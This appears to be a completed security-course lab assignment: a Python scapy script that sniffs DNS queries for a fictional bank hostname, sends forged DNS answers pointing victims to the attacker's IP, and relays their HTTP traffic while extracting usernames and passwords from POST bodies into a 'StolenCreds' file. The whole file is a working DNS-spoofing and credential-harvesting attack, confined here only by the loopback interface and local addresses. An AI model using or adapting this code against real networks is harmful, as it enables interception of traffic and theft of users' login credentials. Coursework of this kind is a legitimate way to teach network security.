import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8888
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	conditions = ["POST", "username=", "password="]
	if all(condition in client_data for condition in conditions):
		user_and_after = client_data.split("username=")[1] # second half after the delimiter
		user = user_and_after.split("&")[0] # first half befpre the delimiter
		passwd_and_after = client_data.split("password=")[1]
		passwd = passwd_and_after.split("&")[0]
		log_credentials(user, passwd)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

	# TODO: accept a new connection from the client on client_socket and
	# create a new socket to connect to the actual host associated with hostname.

	# TODO: read data from client socket, check for credentials, and forward along to host socket.
	# Check for POST to '/post_logout' and exit after that request has completed.
	data_amount = 50000
	while True:

		accepted_socket, _ = client_socket.accept()
		# Read data from client socket
		client_data = accepted_socket.recv(data_amount) # allow amount Bytes of data to be transfered
		check_credentials(str(client_data)) # jackpot!
		# Create a new socket to connect to the actual host associated with hostname
		real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		real_server_socket.connect((resolve_hostname(hostname), WEB_PORT)) # port = 80 is associated with HTTP

		# Forward the received data to the host socket
		real_server_socket.sendall(client_data)
		real_server_response = real_server_socket.recv(data_amount)
		accepted_socket.sendall(real_server_response)		
		# Close the sockets
		accepted_socket.close()
		real_server_socket.close()

		# Check if the received data contains a POST request to '/post_logout'
		conditions = ["POST", "/post_logout"]
		if all(condition in client_data for condition in conditions):
			client_socket.close()
			sys.exit()  # Exit the loop if the condition is met

def dns_callback(packet, extra_args):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	
	if packet.haslayer(DNS):
		my_socket, source_ip = extra_args  # as we passed in sniff_and_spoof()
		try:
			pkt_ip = packet[IP]
			pkt_udp = packet[UDP]
			pkt_dns = packet[DNS]
			pkt_dnsQR = packet[DNSQR]
			QR_name = str(pkt_dnsQR.qname)

			if HOSTNAME in QR_name:
				# my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=HOSTNAME, rdata=source_ip))
				my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=str.encode(HOSTNAME), rdata=str.encode(source_ip)))
				send(my_response, iface="lo")
				handle_tcp_forwarding(my_socket, source_ip, HOSTNAME)
		except Exception as e:
			print("Error processing packet:", e)

def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.

	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 
	my_socket = None
	try:
		my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket.AF_INET tells socket to use IPV4, socket.SOCK_STREAM indicates a stream oriented socket.
		my_socket.bind((source_ip, WEB_PORT)) # bind socket to (source_ip, WEB_PORT)
		my_socket.listen()
	except Exception as e:
		print("Error: Failed to create or bind socket:", e)
		if my_socket:
			my_socket.close()
		sys.exit(1)

	try:
		# Sniff for DNS packets on the network
		sniff(filter="udp port 53", iface="lo", prn=lambda pkt: dns_callback(pkt, (my_socket, source_ip)))
	except Exception as e:
		print("Error: Failed to sniff packets:", e)
	finally:
	# Close the socket
		if my_socket:
			my_socket.close()

	# Exit the script
	# sys.exit(0)


def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
